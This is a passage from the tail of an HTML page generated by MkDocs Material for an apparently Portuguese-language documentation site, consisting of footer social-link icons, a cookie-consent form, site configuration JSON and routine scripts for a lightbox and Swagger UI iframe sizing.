36.7-10.9 50.3l19.5 5.5c-1.7 3.2-2.9 6.3-2.9 9.8 0 21 42.8 2.9 42.8 33.6 0 18.4-36.8 60.1-54.9 60.1-8 0-53.7-50-53.4-60.1l.3-4.6 52.3-11.5c13-2.6 12.3-22.7-2.9-22.7-3.7 0-43.1 9.2-49.4 10.6-2-5.2-7.5-14.1-13.8-14.1-3.2 0-6.3 3.2-9.5 4-9.2 2.6-31 2.9-21.5 20.1L15.9 298.5c-5.5 1.1-8.9 6.3-8.9 11.8 0 6 5.5 10.9 11.5 10.9 8 0 131.3-28.4 147.4-32.2 2.6 3.2 4.6 6.3 7.8 8.6 20.1 14.4 59.8 85.9 76.4 85.9 24.1 0 58-22.4 71.3-41.9 3.2-4.3 6.9-7.5 12.4-6.9.6 13.8-31.6 34.2-33 43.7-1.4 10.2-1 35.2-.3 41.1 26.7 8.1 52-3.6 77.9-2.9 4.3-21 10.6-41.9 9.8-63.5l-.3-9.5c-1.4-34.2-10.9-38.5-34.8-58.6-1.1-1.1-2.6-2.6-3.7-4 2.2-1.4 1.1-1 4.6-1.7 88.5 0 56.3 183.6 111.5 229.9 33.1-15 72.5-27.9 103.5-47.2-29-25.6-52.6-45.7-72.7-79.9m-196.2 46.1v27.2l11.8-3.4-2.9-23.8zm-68.7-150.4 24.1 61.2 21-13.8-31.3-50.9zm84.4 154.9 2 12.4c9-1.5 58.4-6.6 58.4-14.1 0-1.4-.6-3.2-.9-4.6-26.8 0-36.9 3.8-59.5 6.3"></path></svg> </a> <a class=md-social__link href=https://www.producthunt.com/@horacio_vasconcellos rel=noopener target=_blank title=www.producthunt.com> <svg viewbox="0 0 512 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M326.3 218.8c0 20.5-16.7 37.2-37.2 37.2h-70.3v-74.4h70.3c20.5 0 37.2 16.7 37.2 37.2M504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248m-128.1-37.2c0-47.9-38.9-86.8-86.8-86.8H169.2v248h49.6v-74.4h70.3c47.9 0 86.8-38.9 86.8-86.8"></path></svg> </a> <a class=md-social__link href=https://gitlab.com/horaciovasconcellos rel=noopener target=_blank title=gitlab.com> <svg viewbox="0 0 448 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M94.12 315.1c0 25.9-21.16 47.06-47.06 47.06S0 341 0 315.1s21.16-47.06 47.06-47.06h47.06zm23.72 0c0-25.9 21.16-47.06 47.06-47.06s47.06 21.16 47.06 47.06v117.84c0 25.9-21.16 47.06-47.06 47.06s-47.06-21.16-47.06-47.06zm47.06-188.98c-25.9 0-47.06-21.16-47.06-47.06S139 32 164.9 32s47.06 21.16 47.06 47.06v47.06zm0 23.72c25.9 0 47.06 21.16 47.06 47.06s-21.16 47.06-47.06 47.06H47.06C21.16 243.96 0 222.8 0 196.9s21.16-47.06 47.06-47.06zm188.98 47.06c0-25.9 21.16-47.06 47.06-47.06S448 171 448 196.9s-21.16 47.06-47.06 47.06h-47.06zm-23.72 0c0 25.9-21.16 47.06-47.06 47.06s-47.06-21.16-47.06-47.06V79.06c0-25.9 21.16-47.06 47.06-47.06s47.06 21.16 47.06 47.06zM283.1 385.88c25.9 0 47.06 21.16 47.06 47.06S309 480 283.1 480s-47.06-21.16-47.06-47.06v-47.06zm0-23.72c-25.9 0-47.06-21.16-47.06-47.06s21.16-47.06 47.06-47.06h117.84c25.9 0 47.06 21.16 47.06 47.06s-21.16 47.06-47.06 47.06z"></path></svg> </a> <a class=md-social__link href=http://60pportunities.com.br rel=noopener target=_blank title=60pportunities.com.br> <svg viewbox="0 0 640 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485 485 0 0 0 404.081 32.03a1.82 1.82 0 0 0-1.923.91 338 338 0 0 0-14.9 30.6 447.9 447.9 0 0 0-134.426 0 310 310 0 0 0-15.135-30.6 1.89 1.89 0 0 0-1.924-.91 483.7 483.7 0 0 0-119.688 37.107 1.7 1.7 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.02 2.02 0 0 0 .765 1.375 487.7 487.7 0 0 0 146.825 74.189 1.9 1.9 0 0 0 2.063-.676A348 348 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588 321 321 0 0 1-45.868-21.853 1.885 1.885 0 0 1-.185-3.126 251 251 0 0 0 9.109-7.137 1.82 1.82 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.81 1.81 0 0 1 1.924.233 235 235 0 0 0 9.132 7.16 1.884 1.884 0 0 1-.162 3.126 301.4 301.4 0 0 1-45.89 21.83 1.875 1.875 0 0 0-1 2.611 391 391 0 0 0 30.014 48.815 1.86 1.86 0 0 0 2.063.7A486 486 0 0 0 610.7 405.729a1.88 1.88 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541M222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239 0 32.654-23.41 59.241-52.843 59.241m195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239 0 32.654-23.177 59.241-52.844 59.241"></path></svg> </a> <a class=md-social__link href rel=noopener target=_blank title> <svg viewbox="0 0 512 512" xmlns=http://www.w3.org/2000/svg><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M498.1 5.6c10.1 7 15.4 19.1 13.5 31.2l-64 416c-1.5 9.7-7.4 18.2-16 23s-18.9 5.4-28 1.6L284 427.7l-68.5 74.1c-8.9 9.7-22.9 12.9-35.2 8.1S160 493.2 160 480v-83.6c0-4 1.5-7.8 4.2-10.8l167.6-182.8c5.8-6.3 5.6-16-.4-22s-15.7-6.4-22-.7L106 360.8l-88.3-44.2C7.1 311.3.3 300.7 0 288.9s5.9-22.8 16.1-28.7l448-256c10.7-6.1 23.9-5.5 34 1.4"></path></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <div class=md-consent data-md-component=consent hidden id=__consent> <div class=md-consent__overlay></div> <aside class=md-consent__inner> <form class="md-consent__form md-grid md-typeset" name=consent> <h4>Consentimento</h4> <p>Utilizamos cookies para reconhecer as suas repetidas visitas e preferências, bem como para medir a eficácia da nossa documentação e se os usuários encontre o que eles estão procurando. Com o seu consentimento, você está nos ajudando a melhorar nossa documentação.</p> <input class=md-toggle id=__settings type=checkbox> <div class=md-consent__settings> <ul class=task-list> <li class=task-list-item> <label class=task-list-control> <input checked name=analytics type=checkbox> <span class=task-list-indicator></span> Google Analytics </label> </li> <li class=task-list-item> <label class=task-list-control> <input checked name=github type=checkbox> <span class=task-list-indicator></span> GitHub </label> </li> </ul> </div> <div class=md-consent__controls> <button class="md-button md-button--primary">Accept</button> <label class=md-button for=__settings>Manage settings</label> </div> </form> </aside> </div> <script>var consent=__md_get("__consent");if(consent)for(var input of document.forms.consent.elements)input.name&&(input.checked=consent[input.name]||!1);else"file:"!==location.protocol&&setTimeout((function(){document.querySelector("[data-md-component=consent]").hidden=!1}),250);var form=document.forms.consent;for(var action of["submit","reset"])form.addEventListener(action,(function(e){if(e.preventDefault(),"reset"===e.type)for(var n of document.forms.consent.elements)n.name&&(n.checked=!1);__md_set("__consent",Object.fromEntries(Array.from(new FormData(form).keys()).map((function(e){return[e,!0]})))),location.hash="",location.reload()}))</script> <script id=__config type=application/json>{"base": "../..", "features": ["announce.dismiss", "commit", "content.code.annotation", "content.code.copy", "search.highlight", "search.share", "search.suggest", "version", "content.footnote.tooltips"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": {"default": "latest", "provider": "mike"}}</script> <script src=../../assets/javascripts/bundle.c8b220af.min.js></script> <script src=../../js/timeago.min.js></script> <script src=../../js/timeago_mkdocs_material.js></script> <script src=../../javascripts/tables.js></script> <script src=../../javascripts/tablesort.js></script> <script id=init-glightbox>const lightbox = GLightbox({"touchNavigation": true, "loop": true, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(() => { lightbox.reload() });
</script><script>document$.subscribe(() => {
            window.update_swagger_ui_iframe_height = function (id) {
                var iFrameID = document.getElementById(id);
                if (iFrameID) {
                    full_height = (iFrameID.contentWindow.document.body.scrollHeight + 80) + "px";
                    iFrameID.height = full_height;
                    iFrameID.style.height = full_height;
                }
            }
        
            let iframe_id_list = []
            var iframes = document.getElementsByClassName("swagger-ui-iframe");
            for (var i = 0; i < iframes.length; i++) { 
                iframe_id_list.push(iframes[i].getAttribute("id"))
            }
        
            let ticking = true;
            
            document.addEventListener('scroll', function(e) {
                if (!ticking) {
                    window.requestAnimationFrame(()=> {
                        let half_vh = window.innerHeight/2;
                        for(var i = 0; i < iframe_id_list.length; i++) {
                            let element = document.getElementById(iframe_id_list[i])
                            if(element==null){
                                return
                            }
                            let diff = element.getBoundingClientRect().top
                            if(element.contentWindow.update_top_val){
                                element.contentWindow.update_top_val(half_vh - diff)
                            }
                        }
                        ticking = false;
                    });
                    ticking = true;
                }
            });
        
            const dark_scheme_name = "slate"
            
            window.scheme = document.body.getAttribute("data-md-color-scheme")
            const options = {
                attributeFilter: ['data-md-color-scheme'],
            };
            function color_scheme_callback(mutations) {
                for (let mutation of mutations) {
                    if (mutation.attributeName === "data-md-color-scheme") {
                        scheme = document.body.getAttribute("data-md-color-scheme")
                        var iframe_list = document.getElementsByClassName("swagger-ui-iframe")
                        for(var i = 0; i < iframe_list.length; i++) {
                            var ele = iframe_list.item(i);
                            if (ele) {
                                if (scheme === dark_scheme_name) {
                                    ele.contentWindow.enable_dark_mode();
                                } else {
                                    ele.contentWindow.disable_dark_mode();
                                }
                            }
                        }
                    }
                }
            }
            observer = new MutationObserver(color_scheme_callback);
            observer.observe(document.body, options);
            })</script></body> </html>